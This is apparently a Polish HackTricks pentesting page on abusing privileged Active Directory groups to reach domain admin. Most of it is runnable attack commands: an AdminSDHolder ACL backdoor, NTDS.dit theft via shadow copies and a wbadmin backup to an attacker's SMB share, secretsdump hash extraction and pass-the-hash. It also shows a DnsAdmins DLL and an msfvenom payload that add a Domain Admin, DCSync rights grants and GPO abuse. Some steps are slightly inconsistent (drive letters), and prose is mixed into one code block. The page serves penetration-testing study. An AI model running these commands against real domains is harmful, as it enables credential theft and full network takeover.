# Grupy uprzywilejowane

{{#include ../../banners/hacktricks-training.md}}

## Znane grupy z uprawnieniami administracyjnymi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ta grupa ma uprawnienia do tworzenia kont i grup, które nie są administratorami w domenie. Dodatkowo umożliwia lokalne logowanie do kontrolera domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodawanie nowych użytkowników jest dozwolone, podobnie jak lokalne logowanie do kontrolera domeny (DC).

## Grupa AdminSDHolder

Lista kontroli dostępu (ACL) grupy **AdminSDHolder** jest kluczowa, ponieważ ustala uprawnienia dla wszystkich „chronionych grup” w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, uniemożliwiając nieautoryzowane modyfikacje.

Atakujący mógłby to wykorzystać, modyfikując ACL grupy **AdminSDHolder** i przyznając zwykłemu użytkownikowi pełne uprawnienia. Skutkowałoby to faktycznym nadaniem temu użytkownikowi pełnej kontroli nad wszystkimi chronionymi grupami. Jeśli uprawnienia tego użytkownika zostałyby zmienione lub usunięte, w wyniku działania systemu zostałyby automatycznie przywrócone w ciągu godziny.

Najnowsza dokumentacja Windows Server wciąż traktuje kilka wbudowanych grup operatorów jako obiekty **chronione** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` itd.). Proces **SDProp** uruchamia się na **PDC Emulator** domyślnie co 60 minut, ustawia znacznik `adminCount=1` i wyłącza dziedziczenie na obiektach chronionych. Jest to przydatne zarówno do utrzymania dostępu (persistence), jak i do wykrywania przestarzałych uprzywilejowanych użytkowników, którzy zostali usunięci z chronionej grupy, ale nadal mają ACL bez dziedziczenia.

Polecenia do przeglądania członków i modyfikowania uprawnień obejmują:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostępny jest skrypt przyspieszający proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Po więcej szczegółów odwiedź [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Członkostwo w tej grupie umożliwia odczyt usuniętych obiektów Active Directory, co może ujawnić wrażliwe informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Przydatne do **odzyskiwania wcześniejszych ścieżek uprawnień**. Usunięte obiekty mogą nadal ujawniać `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPNs lub DN usuniętej uprzywilejowanej grupy, który później może zostać przywrócony przez innego operatora.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Dostęp do kontrolera domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik należy do grupy `Server Operators`, co zmienia poziom dostępu.

### Eskalacja uprawnień

Używając `PsService` lub `sc` z Sysinternals, można sprawdzić i zmodyfikować uprawnienia usług. Grupa `Server Operators`, na przykład, ma pełną kontrolę nad niektórymi usługami, co umożliwia wykonywanie dowolnych poleceń i eskalację uprawnień:
```cmd
C:\> .\PsService.exe security AppReadiness
```
To polecenie ujawnia, że `Server Operators` mają pełny dostęp, umożliwiając manipulację usługami w celu uzyskania podwyższonych uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Te uprawnienia pozwalają na przeszukiwanie folderów, wyświetlanie zawartości i kopiowanie plików, nawet bez wyraźnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Do tego procesu konieczne jest użycie określonych skryptów.

Aby wyświetlić członków grupy, wykonaj:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, wykonuje się następujące kroki:

1. Zaimportuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskaj dostęp do i skopiuj pliki z ograniczonych katalogów, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Atak na AD

Bezpośredni dostęp do systemu plików kontrolera domeny pozwala na kradzież bazy danych `NTDS.dit`, która zawiera wszystkie hashe NTLM użytkowników i komputerów domeny.

#### Użycie diskshadow.exe

1. Utwórz kopię w cieniu dysku `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie, użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM` w celu hash retrieval:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashe z `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Po ekstrakcji: Pass-the-Hash do DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Używanie wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującej i zbuforuj poświadczenia SMB na maszynie celu.
2. Użyj `wbadmin.exe` do tworzenia kopii zapasowej systemu i ekstrakcji `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Dla praktycznej demonstracji zobacz [WIDEO DEMONSTRACYJNE Z IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy DnsAdmins mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na Domain Controllers. Ta możliwość otwiera duże pole do eksploatacji.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Uruchomienie dowolnej biblioteki DLL (CVE‑2021‑40469)

> [!NOTE]
> Ta podatność umożliwia wykonanie dowolnego kodu z uprawnieniami SYSTEM w usłudze DNS (zwykle wewnątrz DCs). Została naprawiona w 2021 roku.

Członkowie mogą sprawić, że serwer DNS załaduje dowolną bibliotekę DLL (lokalnie lub z zdalnego udziału) używając poleceń takich jak:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponowne uruchomienie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby DLL została załadowana:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Więcej informacji o tym wektorze ataku znajdziesz na ired.team.

#### Mimilib.dll

Możliwe jest także użycie mimilib.dll do wykonywania poleceń, modyfikując ją tak, aby uruchamiała określone komendy lub reverse shelle. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) aby uzyskać więcej informacji.

### Rekord WPAD dla MitM

DnsAdmins mogą modyfikować rekordy DNS, aby przeprowadzać ataki Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokowanych zapytań. Narzędzia takie jak Responder czy Inveigh mogą być użyte do spoofingu i przechwytywania ruchu sieciowego.

### Event Log Readers
Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, potencjalnie znajdując w nich wrażliwe informacje, takie jak hasła w postaci jawnej lub szczegóły wykonywania poleceń:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Uprawnienia Exchange Windows

Ta grupa może modyfikować DACLs na obiekcie domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę są szczegółowo opisane w repozytorium Exchange-AD-Privesc na GitHub.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Jeśli możesz działać jako członek tej grupy, klasycznym nadużyciem jest przyznanie kontrolowanemu przez atakującego podmiotowi uprawnień replikacji potrzebnych do [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historycznie, **PrivExchange** łączył dostęp do skrzynek pocztowych, wymuszał uwierzytelnianie Exchange i wykorzystywał LDAP relay, aby dojść do tej samej prymitywy. Nawet tam, gdzie ścieżka LDAP relay jest załatana, bezpośrednie członkostwo w `Exchange Windows Permissions` lub kontrola serwera Exchange nadal stanowi cenną drogę do uzyskania praw replikacji domeny.

## Administratorzy Hyper-V

Administratorzy Hyper-V mają pełny dostęp do Hyper-V, co można wykorzystać do przejęcia kontroli nad zwirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie działających DC i wyodrębnianie hashy NTLM z pliku NTDS.dit.

### Przykład wykorzystania

Praktyczne nadużycie to zazwyczaj **dostęp offline do dysków/checkpointów DC** zamiast starych trików LPE na poziomie hosta. Mając dostęp do hosta Hyper-V, operator może utworzyć checkpoint lub wyeksportować zwirtualizowany kontroler domeny, zamontować VHDX i wyodrębnić `NTDS.dit`, `SYSTEM`, i inne tajne dane bez dotykania LSASS wewnątrz gościa:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Stamtąd ponownie użyj workflow `Backup Operators`, aby skopiować `Windows\NTDS\ntds.dit` oraz pliki rejestru offline.

## Group Policy Creators Owners

Ta grupa umożliwia członkom tworzenie Group Policies w domenie. Jednak członkowie tej grupy nie mogą stosować zasad grupy do użytkowników lub grup ani edytować istniejących GPO.

Ważna niuans polega na tym, że **twórca staje się właścicielem nowego GPO** i zwykle otrzymuje wystarczające uprawnienia do jego późniejszej edycji. Oznacza to, że ta grupa jest interesująca, kiedy możesz:

- utworzyć złośliwy GPO i przekonać administratora, aby powiązał go z docelowym OU/domeną
- edytować GPO, które utworzyłeś i które jest już powiązane w użytecznym miejscu
- nadużyć innego delegowanego uprawnienia, które pozwala powiązać GPO, podczas gdy ta grupa daje Ci możliwość ich edycji

W praktyce nadużycie zwykle oznacza dodanie **Immediate Task**, **startup script**, **local admin membership** lub zmiany **user rights assignment** za pomocą plików polityki opartych na SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Jeśli edytujesz GPO ręcznie przez `SYSVOL`, pamiętaj, że sama zmiana nie wystarczy: trzeba też zaktualizować `versionNumber`, `GPT.ini` i czasami `gPCMachineExtensionNames`, inaczej klienci zignorują odświeżenie polityki.

## Zarządzanie organizacją

W środowiskach, w których wdrożono **Microsoft Exchange**, specjalna grupa znana jako **Organization Management** posiada znaczące uprawnienia. Grupa ta ma przywilej **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** i zachowuje **pełną kontrolę nad jednostką organizacyjną (OU) 'Microsoft Exchange Security Groups'**. Ta kontrola obejmuje grupę **`Exchange Windows Permissions`**, którą można wykorzystać do eskalacji uprawnień.

### Wykorzystywanie uprawnień i polecenia

#### Print Operators

Członkowie grupy **Print Operators** mają kilka przywilejów, w tym **`SeLoadDriverPrivilege`**, który pozwala im **zalogować się lokalnie na kontrolerze domeny**, wyłączyć go i zarządzać drukarkami. Aby wykorzystać te uprawnienia, szczególnie jeśli **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez uprzywilejowania, konieczne jest obejście Kontroli konta użytkownika (UAC).

Aby wypisać członków tej grupy, używa się następującego polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na kontrolerach domeny ta grupa jest niebezpieczna, ponieważ domyślna polityka kontrolera domeny przyznaje **`SeLoadDriverPrivilege`** członkom `Print Operators`. Jeśli uzyskasz podwyższony token dla członka tej grupy, możesz włączyć ten przywilej i załadować podpisany, lecz podatny sterownik, aby uzyskać eskalację do kernel/SYSTEM. Szczegóły dotyczące obsługi tokenów znajdziesz w [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Użytkownicy pulpitu zdalnego

Członkowie tej grupy mają przyznany dostęp do komputerów za pomocą Remote Desktop Protocol (RDP). Aby wyenumerować tych członków, dostępne są polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje na temat wykorzystywania RDP można znaleźć w dedykowanych zasobach pentesting.

#### Użytkownicy zdalnego zarządzania

Członkowie mogą uzyskiwać dostęp do komputerów za pośrednictwem **Windows Remote Management (WinRM)**. Enumerację tych członków przeprowadza się za pomocą:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
W przypadku technik eksploatacji związanych z **WinRM** należy odwołać się do odpowiedniej dokumentacji.

#### Operatorzy serwerów

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia kopii zapasowych i przywracania, zmiany czasu systemowego oraz wyłączania systemu. Aby wyenumerować członków, użyj podanego polecenia:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na kontrolerach domeny `Server Operators` zazwyczaj dziedziczą wystarczające uprawnienia, aby **przekonfigurować lub uruchomić/zatrzymać usługi** i dodatkowo otrzymują `SeBackupPrivilege`/`SeRestorePrivilege` w ramach domyślnej polityki DC. W praktyce czyni to z nich pomost między **service-control abuse** a **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Jeśli service ACL nadaje tej grupie prawa do zmiany/uruchamiania usługi, wskaż usługę na dowolne polecenie, uruchom ją jako `LocalSystem`, a następnie przywróć oryginalny `binPath`. Jeśli kontrola usług jest zablokowana, użyj technik `Backup Operators` opisanych powyżej, aby skopiować `NTDS.dit`.

## Źródła <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
